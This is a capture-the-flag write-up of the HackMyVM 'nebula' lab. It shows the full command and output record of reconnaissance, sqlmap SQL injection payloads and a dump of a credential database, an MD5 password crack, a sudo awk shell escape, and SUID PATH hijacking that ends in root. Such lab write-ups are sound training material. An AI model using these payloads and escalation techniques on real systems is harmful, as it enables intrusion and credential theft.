# nebula

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| nebula | Kretinga | Beginner | HackMyVM |

**Summary:** The exploitation of the Nebula machine begins with a comprehensive reconnaissance phase that identifies an exposed web service and a hidden directory structure. Discovery of a sensitive PDF document reveals hardcoded credentials within a URL, providing initial authenticated access to a private portal. This portal hosts a vulnerable search feature susceptible to SQL injection, which allows for the extraction of SSH credentials from the underlying database. After gaining a shell as the pmccentral user, lateral movement is achieved by leveraging a permissive sudo configuration for the awk utility. The final stage involves the exploitation of a custom SUID binary that suffers from an insecure PATH vulnerability, allowing for a hijacked execution flow that results in full root administrative privileges.

---

**Reconnaissance**

The engagement began with a network discovery scan to identify the target host within the local subnet. Using a custom PowerShell script, the IP address 192.168.100.183 was successfully located.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.183 08:00:27:90:E9:BF VirtualBox
```

A subsequent Nmap scan was performed to enumerate the open ports and services running on the machine. The results indicated an OpenSSH server on port 22 and an Apache web server on port 80.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nebula]
└─$ nmap -sC -sV -p- 192.168.100.183
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-09 17:45 WIB
Nmap scan report for 192.168.100.183
Host is up (0.0011s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Nebula Lexus Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.23 seconds
```

Navigating to the web application revealed the Nebula Lexus Labs homepage, which served as the primary attack surface.

![](image-2.png)

To uncover hidden directories, feroxbuster was employed with a comprehensive wordlist. The scan revealed several interesting endpoints, including a login portal and a joinus directory.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nebula]
└─$ feroxbuster -u http://192.168.100.183 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,txt,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.183/
 🚩  In-Scope Url          │ 192.168.100.183
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      316c http://192.168.100.183/img => http://192.168.100.183/img/
200      GET     1121l     5980w   469563c http://192.168.100.183/img/image2
301      GET        9l       28w      318c http://192.168.100.183/login => http://192.168.100.183/login/
200      GET      117l      627w    49089c http://192.168.100.183/img/image1
200      GET       76l      291w     3479c http://192.168.100.183/
200      GET       39l       78w     1551c http://192.168.100.183/login/index.php
302      GET        0l        0w        0c http://192.168.100.183/login/dashboard.php => login.php
301      GET        9l       28w      319c http://192.168.100.183/joinus => http://192.168.100.183/joinus/
200      GET      563l     2619w   147321c http://192.168.100.183/joinus/application_form.pdf
200      GET       44l      157w     1712c http://192.168.100.183/joinus/index.php
```

**Initial Access**

Inspection of the discovered PDF file at `/joinus/application_form.pdf` yielded a significant find: a URL link containing embedded credentials.

![](image.png)

These credentials allowed for a successful login into the restricted dashboard of the web application.

![](image-1.png)

Within the dashboard, a search feature was identified at the `search_central.php` endpoint. Testing this parameter revealed a potential SQL injection vulnerability.

![](image-3.png)

To confirm and exploit this flaw, sqlmap was utilized. The tool successfully identified multiple injection techniques, including boolean based blind, time based blind, and UNION query methods.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nebula]
└─$ sqlmap -u "http://192.168.100.183/login/search_central.php?id=1" --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:11:09 /2026-05-09/

[18:11:09] [INFO] testing connection to the target URL
[18:11:09] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:11:10] [INFO] testing if the target URL content is stable
[18:11:10] [INFO] target URL content is stable
[18:11:10] [INFO] testing if GET parameter 'id' is dynamic
[18:11:10] [INFO] GET parameter 'id' appears to be dynamic
[18:11:10] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[18:11:10] [INFO] testing for SQL injection on GET parameter 'id'
[18:11:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:11:10] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Security")
[18:11:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[18:11:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:11:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:11:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:11:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:11:10] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:11:10] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[18:11:10] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:11:10] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[18:11:10] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:11:10] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:11:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:11:10] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
[18:11:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[18:11:10] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[18:11:10] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:11:10] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[18:11:10] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[18:11:11] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[18:11:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[18:11:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[18:11:11] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[18:11:11] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[18:11:11] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[18:11:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[18:11:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[18:11:11] [INFO] testing 'Generic inline queries'
[18:11:11] [INFO] testing 'MySQL inline queries'
[18:11:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:11:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:11:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:11:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:11:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:11:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:11:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:11:21] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[18:11:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:11:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:11:21] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:11:21] [INFO] target URL appears to have 3 columns in query
[18:11:21] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3693=3693 AND 'EQMr'='EQMr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 8119 FROM (SELECT(SLEEP(5)))tSea) AND 'EZaT'='EZaT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a7a6271,0x68616965456a79596f4f75456d686b544c4a6e494e486a424676546f527a56737470474f4b735470,0x716b716271),NULL-- -
---
[18:11:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:11:21] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/192.168.100.183'
[18:11:21] [WARNING] your sqlmap version is outdated

[*] ending @ 18:11:21 /2026-05-09/
```

Proceeding to enumerate the databases, the nebuladb was discovered.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nebula]
└─$ sqlmap -u "http://192.168.100.183/login/search_central.php?id=1" --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible by any misuse or damage caused by this program

[*] starting @ 18:12:49 /2026-05-09/

[18:12:49] [INFO] resuming back-end DBMS 'mysql'
[18:12:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3693=3693 AND 'EQMr'='EQMr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 8119 FROM (SELECT(SLEEP(5)))tSea) AND 'EZaT'='EZaT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a7a6271,0x68616965456a79596f4f75456d686b544c4a6e494e486a424676546f527a56737470474f4b735470,0x716b716271),NULL-- -
---
[18:12:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:12:49] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] nebuladb

[18:12:49] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/192.168.100.183'
[18:12:49] [WARNING] your sqlmap version is outdated

[*] ending @ 18:12:49 /2026-05-09/
```

Dumping the contents of nebuladb provided the credentials for the user pmccentral, which were cracked using a dictionary attack to reveal the password "999999999".

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nebula]
└─$ sqlmap -u "http://192.168.100.183/login/search_central.php?id=1" -D nebuladb --dump-all --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:13:22 /2026-05-09/

[18:13:22] [INFO] resuming back-end DBMS 'mysql'
[18:13:22] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3693=3693 AND 'EQMr'='EQMr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 8119 FROM (SELECT(SLEEP(5)))tSea) AND 'EZaT'='EZaT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a7a6271,0x68616965456a79596f4f75456d686b544c4a6e494e486a424676546f527a56737470474f4b735470,0x716b716271),NULL-- -
---
[18:13:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:13:22] [INFO] fetching tables for database: 'nebuladb'
[18:13:23] [INFO] fetching columns for table 'centrals' in database 'nebuladb'
[18:13:23] [INFO] fetching entries for table 'centrals' in database 'nebuladb'
[18:13:23] [INFO] recognized possible password hashes in column 'passwordssh'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[18:13:23] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[18:13:23] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[18:13:23] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[18:13:23] [INFO] starting 4 processes
[18:13:25] [INFO] cracked password '999999999' for user 'Security Agency'
Database: nebuladb
Table: centrals
[2 entries]
+----+--------------------+------------+--------------------+----------------------------------------------+
| id | role               | userssh    | username           | passwordssh                                  |
+----+--------------------+------------+--------------------+----------------------------------------------+
| 1  | Security           | pmccentral | Security Agency    | c8c605999f3d8352d7bb792cf3fdb25b (999999999) |
| 2  | Scientific Central | NULL       | Scientific Central | 40928bc415ab50954a2582018402...              |
+----+--------------------+------------+--------------------+----------------------------------------------+

[18:13:40] [INFO] table 'nebuladb.centrals' dumped to CSV file '/home/ouba/.local/share/sqlmap/output/192.168.100.183/dump/nebuladb/centrals.csv'
[18:13:40] [INFO] fetching columns for table 'central' in database 'nebuladb'
[18:13:40] [INFO] fetching entries for table 'central' in database 'nebuladb'
[18:13:40] [INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[18:13:40] [INFO] using hash method 'md5_generic_passwd'
[18:13:40] [INFO] resuming password '999999999' for hash 'c8c605999f3d8352d7bb792cf3fdb25b' for user 'pmccentral'
[18:13:40] [INFO] starting dictionary-based cracking (md5_generic_passwd)
Database: nebuladb
Table: central
[2 entries]
+----+--------------+----------------------------------------------+-------------+
| id | role         | password                                     | username    |
+----+--------------+----------------------------------------------+-------------+
| 1  | Security     | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
| 2  | Experiment 1 | 6dd0ec0f2c1588fcff2b4cf6b4eca72e             | experiment1 |
+----+--------------+----------------------------------------------+-------------+

[18:13:59] [INFO] table 'nebuladb.central' dumped to CSV file '/home/ouba/.local/share/sqlmap/output/192.168.100.183/dump/nebuladb/central.csv'
[18:13:59] [INFO] fetching columns for table 'users' in database 'nebuladb'
[18:13:59] [INFO] fetching entries for table 'users' in database 'nebuladb'
[18:13:59] [INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[18:13:59] [INFO] using hash method 'md5_generic_passwd'
[18:13:59] [INFO] resuming password '999999999' for hash 'c8c605999f3d8352d7bb792cf3fdb25b' for user 'pmccentral'
[18:13:59] [INFO] starting dictionary-based cracking (md5_generic_passwd)
Database: nebuladb
Table: users
[7 entries]
+----+----------+----------------------------------------------+-------------+
| id | is_admin | password                                     | username    |
+----+----------+----------------------------------------------+-------------+
| 1  | 1        | d46df8e6a5627debf930f7b5c8f3b083             | admin       |
| 2  | 0        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
| 3  | 0        | 5f823f1ac7c9767c8d1efbf44158e0ea             | Frederick   |
| 3  | 0        | 4c6dda8a9d149332541e577b53e2a3ea             | Samuel      |
| 5  | 0        | 41ae0e6fbe90c08a63217fc964b12903             | Mary        |
| 6  | 0        | 5d8cdc88039d5fc021880f9af4f7c5c3             | hecolivares |
| 7  | 1        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
+----+----------+----------------------------------------------+-------------+

[18:14:17] [INFO] table 'nebuladb.users' dumped to CSV file '/home/ouba/.local/share/sqlmap/output/192.168.100.183/dump/nebuladb/users.csv'
[18:14:17] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/192.168.100.183'
[18:14:17] [WARNING] your sqlmap version is outdated

[*] ending @ 18:14:17 /2026-05-09/
```

With the recovered credentials, an SSH session was established as the pmccentral user.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nebula]
└─$ ssh pmccentral@192.168.100.183
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
pmccentral@192.168.100.183's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

2 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 18 20:05:04 2023 from 192.168.193.186
pmccentral@laboratoryuser:~$ id
uid=1001(pmccentral) gid=1001(pmccentral) groups=1001(pmccentral)
pmccentral@laboratoryuser:~$ ls -la
total 44
drwxr-xr-x 7 pmccentral pmccentral 4096 Dec 17  2023 .
drwxr-xr-x 4 root       root       4096 Dec 17  2023 ..
-rw------- 1 pmccentral pmccentral  304 Dec 17  2023 .bash_history
-rw-r--r-- 1 pmccentral pmccentral  220 Dec 16  2023 .bash_logout
-rw-r--r-- 1 pmccentral pmccentral 3771 Dec 16  2023 .bashrc
drwx------ 2 pmccentral pmccentral 4096 Dec 17  2023 .cache
drwxrwxr-x 2 pmccentral pmccentral 4096 Dec 16  2023 desktop
drwxrwxr-x 2 pmccentral pmccentral 4096 Dec 17  2023 documents
drwxrwxr-x 2 pmccentral pmccentral 4096 Dec 16  2023 downloads
drwxrwxr-x 3 pmccentral pmccentral 4096 Dec 16  2023 .local
-rw-r--r-- 1 pmccentral pmccentral  807 Dec 16  2023 .profile
```

**Lateral Movement**

Initial enumeration of the local environment involved checking the available users and exploring the current user's activity. The bash history provided insights into previous directory creations and file inspections.

```bash
pmccentral@laboratoryuser:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
laboratoryuser:x:1000:1000:laboratoryuser:/home/laboratoryuser:/bin/bash
pmccentral:x:1001:1001:,,,:/home/pmccentral:/bin/bash
laboratoryadmin:x:1002:1002:,,,:/home/laboratoryadmin:/bin/bash
pmccentral@laboratoryuser:~$ ls -la /home
total 16
drwxr-xr-x  4 root            root            4096 Dec 17  2023 .
drwxr-xr-x 19 root            root            4096 Dec 16  2023 ..
drwx------  8 laboratoryadmin laboratoryadmin 4096 Dec 18  2023 laboratoryadmin
drwxr-xr-x  7 pmccentral      pmccentral      4096 Dec 17  2023 pmccentral
pmccentral@laboratoryuser:~$ cat .bash_history
ls
cd laboratoryuser/
sudo su
cd pmccentral/
ls
nano
ls
mkdir desktop downloads documents
ls
ll
exit
ls
tree
ls
ls desktop/k
ls desktop/
ls documents/
ls
ls downloads/
cd documents/
ls
cat employees.txt
cd ..
ls
cd laboratoryadmin/
ls
cd autoScripts/
ls
whoami
ll
ls
cd ..
ls
exit
ls
cd documents/
exit
```

A detailed search of the directory structure revealed a root owned text file containing an extensive list of employees.

```bash
pmccentral@laboratoryuser:~$ ls -la ./*
./desktop:
total 8
drwxrwxr-x 2 pmccentral pmccentral 4096 Dec 16  2023 .
drwxr-xr-x 7 pmccentral pmccentral 4096 Dec 17  2023 ..

./documents:
total 12
drwxrwxr-x 2 pmccentral pmccentral 4096 Dec 17  2023 .
drwxr-xr-x 7 pmccentral pmccentral 4096 Dec 17  2023 ..
-rw-r--r-- 1 root       root        875 Dec 17  2023 employees.txt

./downloads:
total 8
drwxrwxr-x 2 pmccentral pmccentral 4096 Dec 16  2023 .
drwxr-xr-x 7 pmccentral pmccentral 4096 Dec 17  2023 ..
pmccentral@laboratoryuser:~$ cat documents/employees.txt
aren
Aarika
Abagael
Abagail
Abbe
Abbey
Abbi
Abbie
Abby
Abbye
Abigael
Abigail
Abigale
Abra
Ada
Adah
Adaline
Adan
Adara
Adda
Addi
Addia
Addie
Addy
Adel
...
Alexia
Alexina
Alexine
Alexis
```

Checking sudo privileges revealed that the pmccentral user could execute the awk utility as the laboratoryadmin user without a password.

```bash
pmccentral@laboratoryuser:~$ sudo -l
[sudo] password for pmccentral:
Matching Defaults entries for pmccentral on laboratoryuser:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pmccentral may run the following commands on laboratoryuser:
    (laboratoryadmin) /usr/bin/awk
```

By using the system function within awk, a shell was spawned as the laboratoryadmin user.

```bash
pmccentral@laboratoryuser:~$ sudo -u laboratoryadmin /usr/bin/awk 'BEGIN {system("/bin/bash")}'
laboratoryadmin@laboratoryuser:/home/pmccentral$ cd
laboratoryadmin@laboratoryuser:~$ id
uid=1002(laboratoryadmin) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
laboratoryadmin@laboratoryuser:~$ ls -la
total 52
drwx------ 8 laboratoryadmin laboratoryadmin 4096 Dec 18  2023 .
drwxr-xr-x 4 root            root            4096 Dec 17  2023 ..
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 18  2023 autoScripts
-rw------- 1 laboratoryadmin laboratoryadmin   74 Dec 18  2023 .bash_history
-rw-r--r-- 1 laboratoryadmin laboratoryadmin  220 Dec 17  2023 .bash_logout
-rw-r--r-- 1 laboratoryadmin laboratoryadmin 3771 Dec 17  2023 .bashrc
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 desktop
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 documents
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 downloads
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 home
drwxrwxr-x 3 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 .local
-rw-r--r-- 1 laboratoryadmin laboratoryadmin  807 Dec 17  2023 .profile
-rw-r--r-- 1 laboratoryadmin laboratoryadmin   33 Dec 18  2023 user.txt
```

**Privilege Escalation**

Investigation of the laboratoryadmin home directory revealed an autoScripts folder containing a SUID binary named PMCEmployees.

```bash
laboratoryadmin@laboratoryuser:~$ cd autoScripts/
laboratoryadmin@laboratoryuser:~/autoScripts$ ls -la
total 32
drwxr-xr-x 2 laboratoryadmin laboratoryadmin  4096 Dec 18  2023 .
drwx------ 8 laboratoryadmin laboratoryadmin  4096 Dec 18  2023 ..
-rwxrwxr-x 1 laboratoryadmin laboratoryadmin     8 Dec 18  2023 head
-rwsr-xr-x 1 root            root            16792 Dec 17  2023 PMCEmployees
laboratoryadmin@laboratoryuser:~/autoScripts$ file PMCEmployees
PMCEmployees: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2e8e1b3a3f1bba666df17c97871f88b0377343fb, for GNU/Linux 3.2.0, not stripped
```

Executing the binary showed that it listed the top employees, likely using the head command internally.

```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
aren
Aarika
Abagael
Abagail
Abbe
Abbey
Abbi
Abbie
Abby
Abbye
Showing top 10 best employees of PMC company
```

Since the binary did not specify the absolute path for the head command, a PATH hijacking attack was possible. A malicious head script was created to spawn a privileged shell, and the current directory was added to the beginning of the PATH environment variable.

```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ file head
head: ASCII text
laboratoryadmin@laboratoryuser:~/autoScripts$ cat head
bash -p
laboratoryadmin@laboratoryuser:~/autoScripts$ export PATH=$(pwd):$PATH
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
root@laboratoryuser:~/autoScripts# id
uid=0(root) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
```

Full root access was obtained, allowing for the retrieval of both the user and root flags.

```bash
root@laboratoryuser:~/autoScripts# su -
root@laboratoryuser:~# id
uid=0(root) gid=0(root) groups=0(root)
root@laboratoryuser:~# whoami
root
root@laboratoryuser:~# hostname
laboratoryuser
root@laboratoryuser:~# cat /home/laboratoryadmin/user.txt
flag{[REDACTED]53}
root@laboratoryuser:~# cat /root/root.txt
flag{[REDACTED]s0}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Identified the target IP and enumerated open ports 22 and 80 using Nmap, followed by directory discovery with feroxbuster to locate a sensitive PDF file.
2. **Vulnerability Discovery**: Found hardcoded credentials in a URL within a PDF document and identified an SQL injection vulnerability in the search functionality of the authenticated web portal.
3. **Exploitation**: Used sqlmap to exploit the SQL injection and dump the database, recovering the pmccentral user password to gain initial SSH access.
4. **Internal Enumeration**: Performed local system enumeration and discovered a permissive sudo rule allowing execution of awk as another user, as well as a SUID binary in the secondary user's home directory.
5. **Privilege Escalation**: Escalated privileges to laboratoryadmin via sudo awk and then achieved root access by exploiting an insecure PATH vulnerability in the SUID PMCEmployees binary.

